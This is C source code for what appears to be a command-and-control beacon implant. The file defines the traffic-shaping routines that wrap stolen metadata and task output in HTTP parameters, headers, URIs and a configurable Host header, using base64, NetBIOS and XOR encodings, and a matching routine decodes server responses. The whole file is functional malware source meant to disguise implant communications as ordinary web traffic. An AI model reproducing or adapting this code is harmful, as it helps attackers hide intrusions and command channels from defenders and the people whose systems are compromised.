#include <windows.h>
#include "profile.h"
#include "parse.h"
#include "crypto.h" /* P4.15: 不再直接依赖 tomcrypt */
#include "shlwapi.h"
#include "encoders.h"
	/* for dlog */
#include "beacon.h"

#define IN_APPEND 0x01
#define IN_PREPEND 0x02
#define IN_BASE64 0x03
#define IN_PRINT 0x04
#define IN_PARAMETER 0x5
#define IN_HEADER 0x6
#define IN_BUILD  0x7
#define IN_NETBIOS 0x8
#define IN_ADD_PARAMETER 0x9
#define IN_ADD_HEADER 0xa
#define IN_NETBIOSU 0xb
#define IN_URI_APPEND 0xc
#define IN_BASE64URL 0xd
#define IN_MASK 0xf
#define IN_ADD_HEADER_HOST 0x10

/* define the size of any statically allocated vars where we will stuff data */
#define STATIC_ALLOC_SIZE 8192

void apply(char * program, profile * myprofile, char * arg1, int len1, char * arg2, int len2) {
	int x  = 0;
	int sz = 0;
	char arg[1024]   = {0};
	int next = 0;
	int status = 0;
	int length = 0;
	datap parser;
	char * hosth   = NULL;
	BOOL   hostset = FALSE;

	/* populate our host header, please */
	hosth = setting_ptr(SETTING_HOST_HEADER);

	data_init(&parser, program, 1024);

	while (1) {
		next = data_int(&parser);
		switch (next) {
			case IN_APPEND:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024); /* sz = strlen(arg) + 1 */

				/* concat arg to temp */
				memcpy(myprofile->temp + length, arg, sz);
				length += strlen(arg);

				break;

			case IN_PREPEND:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024); /* sz = strlen(arg) + 1 */

				/* concat temp and arg */
				memcpy(myprofile->stage, arg, sz);
				memcpy(myprofile->stage + strlen(arg), myprofile->temp, length);
				length += strlen(arg);

				/* ok, let's move all of this over */
				memset(myprofile->temp, 0, myprofile->max);
				memcpy(myprofile->temp, myprofile->stage, length);

				break;

			case IN_BASE64:
				sz = length;
				x  = myprofile->max;

				status = crypto_base64_encode((const unsigned char *)myprofile->temp, sz, (unsigned char *)myprofile->stage, (unsigned long*) & x);
				if (status != CRYPTO_OK) {
					return;
				}
				length = x;
				memset(myprofile->temp, 0, myprofile->max);
				memcpy(myprofile->temp, myprofile->stage, x);
				break;
			case IN_BASE64URL:
				sz = length;
				x = myprofile->max;

				status = base64url_encode((const unsigned char*)myprofile->temp, sz, (unsigned char*)myprofile->stage, (unsigned long*)&x);
				if (status != CRYPTO_OK) {
					return;
				}
				length = x;
				memset(myprofile->temp, 0, myprofile->max);
				memcpy(myprofile->temp, myprofile->stage, length);
				break;
			case IN_PRINT:
				memcpy(myprofile->buffer, myprofile->temp, length);
				myprofile->blen = length;
				break;

			case IN_PARAMETER:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024);

				/* it's OK to squash temp as this is a terminal point for our data */
				if (myprofile->parameters[0] == 0) {
					_snprintf(myprofile->stage, 1024, "?%s=%s", arg, myprofile->temp);
				}
				else {
					_snprintf(myprofile->stage, 1024, "%s&%s=%s", myprofile->parameters, arg, myprofile->temp);
				}
				memcpy(myprofile->parameters, myprofile->stage, 1024);
				break;

			case IN_HEADER:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024);
				_snprintf(myprofile->stage, 1024, "%s%s: %s\r\n", myprofile->headers, arg, myprofile->temp);
				memcpy(myprofile->headers, myprofile->stage, 1024);
				break;

			case IN_BUILD:
				/* extract the name of the argument we want to get */
				x = data_int(&parser);

				/* if the argument is metadata, copy that to temp */
				if (x == 0) {
					memcpy(myprofile->temp, arg1, len1);
					length = len1;
				}
				else if (x == 1) {
					memcpy(myprofile->temp, arg2, len2);
					length = len2;
				}
				break;

			case IN_NETBIOS:
				sz = netbios_encode('a', myprofile->temp, length, myprofile->stage, myprofile->max);
				length = sz;
				memset(myprofile->temp, 0, myprofile->max);
				memcpy(myprofile->temp, myprofile->stage, length);
				break;

			case IN_ADD_PARAMETER:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024);

				/* it's OK to squash temp as this is a terminal point for our data */
				if (myprofile->parameters[0] == 0) {
					_snprintf(myprofile->stage, 1024, "?%s", arg);
				}
				else {
					_snprintf(myprofile->stage, 1024, "%s&%s", myprofile->parameters, arg);
				}
				memcpy(myprofile->parameters, myprofile->stage, 1024);
				break;

			case IN_ADD_HEADER:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024);
				_snprintf(myprofile->stage, 1024, "%s%s\r\n", myprofile->headers, arg);
				memcpy(myprofile->headers, myprofile->stage, 1024);
				break;

			case IN_ADD_HEADER_HOST:
				memset(arg, 0x0, 1024);
				sz = data_string(&parser, arg, 1024);
				/* allow the global HTTP Host header value to override this value */
				if (hosth != NULL && strlen(hosth) > 0) {
					_snprintf(myprofile->stage, 1024, "%s%s\r\n", myprofile->headers, hosth);
					hostset = TRUE;
				}
				/* use what the profile specifies */
				else {
					_snprintf(myprofile->stage, 1024, "%s%s\r\n", myprofile->headers, arg);
				}
				memcpy(myprofile->headers, myprofile->stage, 1024);
				break;

			case IN_NETBIOSU:
				sz = netbios_encode('A', myprofile->temp, length, myprofile->stage, myprofile->max);
				length = sz;
				memset(myprofile->temp, 0, myprofile->max);
				memcpy(myprofile->temp, myprofile->stage, length);
				break;

			case IN_MASK:
				sz = xor_encode(myprofile->temp, length, myprofile->stage, myprofile->max);
				length = sz;
				memset(myprofile->temp, 0, myprofile->max);
				memcpy(myprofile->temp, myprofile->stage, length);
				break;

			case IN_URI_APPEND:
				_snprintf(myprofile->stage, 1024, "%s%s", myprofile->uri, myprofile->temp);
				memcpy(myprofile->uri, myprofile->stage, 1024);
				break;

			case 0x0:
				/* set our HTTP Host header, if it needs to be set. Thanks! */
				if (!hostset && hosth != NULL && strlen(hosth) > 0) {
					_snprintf(myprofile->stage, 1024, "%s%s\r\n", myprofile->headers, hosth);
					memcpy(myprofile->headers, myprofile->stage, 1024);
				}
				return;
		}
	}
}

int recover(char * program, char * buffer, int read, int max) {
	int sz = 0;
	int tlen = max;
	int status = 0;
	char arg[1024]   = {0};
	char * temp      = NULL;
	int next = 0;
	datap parser;

	/* allocate a buffer to process our recover program with */
	temp = (char *)malloc(read);
	if (temp == NULL)
		return 0;

	data_init(&parser, program, 1024);

	while (1) {
		next = data_int(&parser);
		switch (next) {
			case IN_APPEND:
				/* strip right [sz] characters from buffer */
				sz    = data_int(&parser);
				read -= sz;

				/* SAFETY: corrupt data? we'll strip more data than we have */
				if (read < 0)
					goto cleanup;

				break;

			case IN_PREPEND:
				/* strip left [sz] characters */
				sz = data_int(&parser);

				/* SAFETY: corrupt data, we may strip more data than we have */
				if (sz > read)
					goto cleanup;

				/* ok, strip off the first [sz] bytes */
				memcpy(temp, buffer, read);
				memcpy(buffer, temp + sz, read - sz);
				read -= sz;
				break;

			case IN_BASE64:
				/* apply base64 transform to temp */
				buffer[read] = '\0';
				tlen = max;
				status = crypto_base64_decode((const unsigned char *)buffer, read,(unsigned char *) temp, (unsigned long*) & tlen);

				/* SAFETY: failed base64 decode? we're done */
				if (status != CRYPTO_OK)
					goto cleanup;

				read = tlen;
				memcpy(buffer, temp, read);
				break;

			case IN_BASE64URL:
				/* apply base64 transform to temp */
				buffer[read] = '\0';
				tlen = max;
				status = base64url_decode((unsigned char*)buffer, read, max, (unsigned char*)temp, (unsigned long*)&tlen);

				/* SAFETY: failed base64 decode? we're done */
				if (status != CRYPTO_OK)
					goto cleanup;

				read = tlen;
				memcpy(buffer, temp, read);
				break;

			case IN_PRINT:
				break;

			case IN_PARAMETER:
				break;

			case IN_HEADER:
				break;

			case IN_NETBIOS:
				/* apply base64 transform to temp */
				buffer[read] = '\0';
				tlen = max;
				read = netbios_decode('a', buffer, read, temp, tlen);

				/* SAFETY: failed decode */
				if (read == 0)
					goto cleanup;

				memcpy(buffer, temp, read);
				buffer[read] = '\0';
				break;

			case IN_NETBIOSU:
				/* apply base64 transform to temp */
				buffer[read] = '\0';
				tlen = max;
				read = netbios_decode('A', buffer, read, temp, tlen);

				/* SAFETY: failed decode */
				if (read == 0)
					goto cleanup;

				memcpy(buffer, temp, read);
				buffer[read] = '\0';
				break;

			case IN_MASK:
				buffer[read] = '\0';
				tlen = max;
				read = xor_decode(buffer, read, temp, tlen);

				/* SAFETY: failed decode */
				if (read == 0)
					goto cleanup;

				memcpy(buffer, temp, read);
				buffer[read] = '\0';
				break;

			case IN_URI_APPEND:
				break;

			case 0x0:
				free(temp);
				return read;
		}
	}

	free(temp);
	return read;

cleanup:
	free(temp);
	return 0;
}

void profile_setup(profile * prof, int size) {
	prof->max     = size * 3;
	if (prof->max < STATIC_ALLOC_SIZE)
		prof->max = STATIC_ALLOC_SIZE;

	prof->manager    = data_alloc((prof->max * 3) + (1024 * 3));

	/* allocate some of the storage points for our data */
	prof->headers    = (char *)data_ptr((datap *)prof->manager, 1024);
	prof->parameters = (char *)data_ptr((datap *)prof->manager, 1024);
	prof->uri        = (char *)data_ptr((datap *)prof->manager, 1024);

	/* allocate our needed buffers */
	prof->buffer     = (char *)data_ptr((datap *)prof->manager, prof->max);
	prof->temp       = (char *)data_ptr((datap *)prof->manager, prof->max);
	prof->stage      = (char *)data_ptr((datap *)prof->manager, prof->max);

	/* clear out our buffers too */
	prof->blen = 0;
}

void profile_free(profile * prof, int size) {
	data_free((datap *)prof->manager);
}
